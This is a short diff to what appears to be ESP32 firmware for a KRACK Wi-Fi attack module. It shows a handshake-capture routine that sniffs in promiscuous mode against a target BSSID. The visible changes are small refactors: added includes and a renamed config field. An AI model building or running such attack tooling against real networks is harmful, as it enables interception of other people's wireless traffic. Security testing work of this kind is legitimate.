@@ -1,7 +1,10 @@
 #include "krack_advanced.h"
+#include "tx_arm.h"
 #include <LittleFS.h>
+#include <WiFi.h>
 #include <mbedtls/aes.h>
 #include <mbedtls/md.h>
+#include <mbedtls/sha1.h>
 #include <esp_wifi.h>
 
 namespace {
@@ -52,7 +55,7 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
   }
 
   Serial.println("\n=== KRACK Attack - Real Handshake Capture ===");
-  Serial.println("Target: " + String(config.targetBSSID));
+  Serial.println("Target: " + String(config.targetBssid));
   Serial.println("Duration: " + String(config.durationMs) + "ms");
 
   isRunning_ = true;
@@ -64,7 +67,7 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
   esp_wifi_set_promiscuous_rx_cb(&krack_promiscuous_cb);
 
   uint8_t target_bssid[6];
-  sscanf(config.targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+  sscanf(config.targetBssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &target_bssid[0], &target_bssid[1], &target_bssid[2],
          &target_bssid[3], &target_bssid[4], &target_bssid[5]);
 
